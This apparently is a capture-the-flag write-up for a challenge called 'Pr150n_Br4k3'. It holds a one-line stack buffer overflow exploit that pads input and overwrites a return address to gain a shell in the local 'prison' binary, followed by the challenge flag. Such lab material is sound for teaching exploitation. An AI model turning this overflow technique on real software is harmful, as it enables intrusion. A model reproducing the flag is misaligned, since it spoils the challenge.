# Pr150n_Br4k3

Author: [NithinChowdary](https://github.com/nithinchowdary007)

## Description
Really? Do u really want to break the prison you built on your own? Your insane!


## Sources

- [prison](./bin/prison)
- [prison.c](./bin/prison.c)

## Exploit
```sh
(python -c 'print("1\n1\n1\n1\n1\n " + "a"*166 + "\xb2\x11\x40\x00\x00\x00\x00")'; cat )| ./prison

```

The flag is:

```
wtfCTF{Pr150n3rs_35c4p3d_b3f0r3_3v3n_3nt3r1n8}
```
